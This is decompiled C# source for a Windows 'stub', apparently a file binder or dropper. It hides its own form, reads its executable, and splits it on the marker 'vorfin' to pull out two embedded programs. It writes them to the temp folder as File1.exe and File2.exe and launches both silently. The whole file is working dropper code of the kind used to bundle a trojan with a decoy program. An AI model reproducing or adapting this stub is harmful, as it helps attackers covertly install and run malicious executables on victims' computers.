using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub1;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private const string FileSplit = "vorfin";

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_Text("Form1");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		string tempPath = Path.GetTempPath();
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		string text = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref text, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		string[] array = Strings.Split(text, "vorfin", -1, (CompareMethod)0);
		FileSystem.FileOpen(3, tempPath + "\\File1.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(3, array[1], -1L, false);
		FileSystem.FileClose(new int[1] { 3 });
		FileSystem.FileOpen(5, tempPath + "\\File2.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(5, array[2], -1L, false);
		FileSystem.FileClose(new int[1] { 5 });
		Process.Start(tempPath + "\\File1.exe");
		Process.Start(tempPath + "\\File2.exe");
		((Form)this).Close();
	}
}
